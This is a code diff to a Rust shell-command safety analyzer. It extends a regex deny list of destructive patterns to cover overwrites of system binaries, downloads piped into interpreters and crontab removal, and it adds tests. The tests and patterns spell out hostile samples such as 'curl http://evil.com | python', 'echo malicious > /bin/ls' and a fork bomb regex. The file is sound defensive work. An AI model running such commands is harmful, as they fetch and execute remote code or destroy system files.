@@ -23,10 +23,21 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     r">\s*/sys/",
     r">\s*/proc/",
     r">\s*/boot/",
+    r">\s*/bin/",
+    r">\s*/usr/bin/",
+    r">\s*/sbin/",
+    r">\s*/usr/sbin/",
+    r">\s*/lib/",
+    r">\s*/lib64/",
     // Piped execution
     r"\|\s*sh\b",
     r"\|\s*bash\b",
     r"\|\s*zsh\b",
+    r"\|\s*python\b",
+    r"\|\s*perl\b",
+    r"\|\s*ruby\b",
+    r"\|\s*node\b",
+    r"\|\s*php\b",
     r"curl.*\|\s*(sh|bash)",
     r"wget.*\|\s*(sh|bash)",
     // Process killing
@@ -51,6 +62,7 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     r"mv\s+(?:.*\s+)?\*(?:\s+|$)", // Move wildcard
     // System state
     r"^\s*(reboot|shutdown|poweroff|halt|init\s+[06])\b",
+    r"^\s*crontab\s+.*-r",
     // Fork bomb
     r":\(\)\s*\{\s*:\|:&\s*\};:",
 ];
@@ -220,5 +232,21 @@ mod tests {
         // Ensure mv -f is not matching overly broadly
         assert!(!analyzer.is_destructive("mv my-file-final.txt dest"));
         assert!(!analyzer.is_destructive("mv a-f b"));
+    }
+
+    #[test]
+    fn test_enhanced_safety_checks() {
+        let analyzer = SafetyAnalyzer::new();
+
+        // Redirects to system binaries
+        assert!(analyzer.is_destructive("echo malicious > /bin/ls"));
+        assert!(analyzer.is_destructive("cat payload > /usr/bin/python"));
+
+        // Piped execution to other interpreters
+        assert!(analyzer.is_destructive("curl http://evil.com | python"));
+        assert!(analyzer.is_destructive("wget http://evil.com | perl"));
+
+        // Crontab removal
+        assert!(analyzer.is_destructive("crontab -r"));
     }
 }
